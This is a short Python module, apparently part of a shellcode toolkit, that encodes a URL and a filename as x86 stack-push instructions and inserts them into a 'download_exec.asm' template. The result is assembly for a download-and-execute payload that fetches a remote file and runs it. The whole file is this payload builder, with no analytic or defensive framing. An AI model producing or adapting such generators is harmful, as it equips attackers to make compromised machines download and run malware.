from binascii import *
import common
import sys, os

def str2pushdata(string):
    result = []
    pop_result = []
    l = len(string) % 4
    string += '\0' * (4 - l)
    for i in range(0, len(string), 4):
        a = string[i:i+4]
        result.append("push 0x{}".format(b2a_hex(a[::-1])))
        pop_result.append('pop ebx')
    return result[::-1], pop_result

def generate(url, filename):
    push_filename, pop_filename = str2pushdata(filename)
    push_filename = '\n'.join(push_filename) + '\n'
    pop_filename = '\n'.join(pop_filename) + '\n'
    push_url, pop_url = str2pushdata(url)
    push_url = '\n'.join(push_url) + '\n'
    pop_url = '\n'.join(pop_url) + '\n'

    with open(common.locate_file('download_exec.asm'), 'r') as f_in:
        with open(os.path.join(common.locate_dir('tmp'), 'download_exec_tmp.asm'), 'w') as f_out:
            data = f_in.read()
            data = data.format(filename=push_filename, url=push_url, pop_url=pop_url, pop_filename=pop_filename)
            f_out.write(data)
    return
